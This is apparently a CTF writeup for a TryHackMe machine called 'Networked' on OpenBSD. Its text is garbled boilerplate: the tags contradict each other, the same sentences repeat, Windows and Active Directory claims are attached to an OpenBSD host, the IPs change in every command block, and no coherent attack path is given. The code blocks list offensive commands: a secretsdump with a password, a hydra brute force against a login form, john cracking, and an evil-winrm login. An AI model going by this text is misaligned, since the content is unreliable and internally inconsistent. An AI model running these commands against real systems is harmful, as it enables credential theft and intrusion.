---
TitleSEO: "TryHackMe — Networked (Hard OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Networked (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Networked. Silver Ticket and XSS to achieve hard compromise on OpenBSD."
Keywords: "pwntilldawn, linux, ctf, easy, web"
URL: "https://zurefx.github.io/writeups/htb-networked-288.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-networked-288/"
Date: "2026-01-23"
Tags: "PwnTillDawn, Linux, CTF, Easy, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-networked-288"
Permalink: "/writeups/htb-networked-288.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Networked** is rated **Hard** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.72.31.194`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.236.163
nmap -sCV -p110,3268,993 10.125.229.13 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
nmap -sCV -p135,3306,8443 10.39.132.241 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Web Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
nmap -sCV -p636,587,1521 10.119.157.30 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **XSS**.

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
gobuster dir -u http://10.115.229.118/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.112.182.48 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.105.213.68 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.42.252 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.69.133.163/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.18.109 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `crackmapexec`
- `GetNPUsers`
- `burpsuite`
- `nikto`
- `netcat`

### Key Takeaways

- Silver Ticket
- XSS
- DLL Hijacking
